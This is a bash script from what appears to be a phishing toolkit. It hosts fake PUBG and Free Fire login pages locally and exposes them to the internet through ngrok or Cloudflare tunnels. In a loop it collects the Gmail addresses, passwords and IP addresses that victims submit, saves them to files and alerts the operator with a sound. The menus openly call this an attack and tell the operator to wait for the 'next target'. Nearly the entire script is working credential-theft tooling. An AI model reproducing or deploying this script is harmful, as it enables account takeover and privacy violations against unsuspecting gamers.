#################################functions
flare(){
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                      CLOUDFLARED SERVER             |"
echo -e "\e[96m        |         copy this command =>(  bash flare.sh   )    |"
echo -e "\e[96m        |     OPEN NEW SESSION AND RUN ABOVE COMMAND          |"
echo -e "\e[96m        |=====================================================|"

}
local(){
php -S localhost:8080 > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |      [\e[92m1\e[96m]==> NGROK                       |"
echo -e "\e[96m        |      [\e[92m2\e[96m]==> CLOUDFLARE                  |"
echo -e "\e[96m        |=====================================================|"
read -p "CHOOSE SERVER : " flare
if [ $flare == 1 ];
then 
ngrok

elif [ $flare == 2 ];
then 
flare
fi
}
link(){
if [ -e link.txt ];
then
rm link.txt
fi

curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io" > link.txt



}
ngrok(){
cd $HOME
echo -e "\e[91m \t\t PLEASE ON MOBILE HOTSPOT "
sleep 5.0
echo -e "\e[92m\n\t\t LOCALHOST STARTING... "
sleep 2.0
echo -e "\e[92m \n\t\t NGROK STARTING... "

./ngrok http 8080 > /dev/null 2>1&
sleep 5.0
cd joker/.sites/$url
link

echo -e "\e[96m \n \tLOCALHOST : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃  \t\t127.0.0.1:8080                   "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[96m \n \tNGROK LINK : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e " $(cat link.txt)"

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

}

ip(){

if [ -e ip.txt ];
then 
mpv $HOME/joker/cap.mp3 > /dev/null 2>1&

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\n"
echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
echo -e "\e[94m\n┃-------  (SAVE IN IP.TXT)  -------┃"
rm ip.txt
echo -e "\n"
fi
}





clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |       [\e[92m1\e[96m]==> PUBG                       |"
echo -e "\e[96m        |       [\e[92m2\e[96m]==> FREE FIRE                  |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |    NOTE : - PASSWORDS SAVE IN 'www' DIRECTORY       |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
 
echo -e "\n"
read -p " CHOOSE A GAME :  " pubg
case $pubg in 
1)

cd .sites/pubg/notp
url="pubg/notp"
local


while true;

do
ip

if [ -e gmail.txt ];
then
mpv $HOME/joker/cap.mp3 > /dev/null 2>1&


echo -e "\n"
echo -e "\e[98m \n\tGMAIL :  $(cat gmail.txt)  "
cat gmail.txt >> $HOME/joker/www/pubg.txt
rm gmail.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m\n\tPASSWORD :  $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/pubgpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
2)
cd .sites/freefire/notp
url="freefire/notp"
local

while true;

do
ip
if [ -e gmail.txt ];
then
mpv $HOME/joker/cap.mp3 > /dev/null 2>1&

echo -e "\n"
echo -e "\e[98m $(cat gmail.txt)  "
cat gmail.txt >> $HOME/joker/www/ff.txt
rm gmail.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/ffpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
::
esac


HOST='127.0.0.1'
PORT='8080'
ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
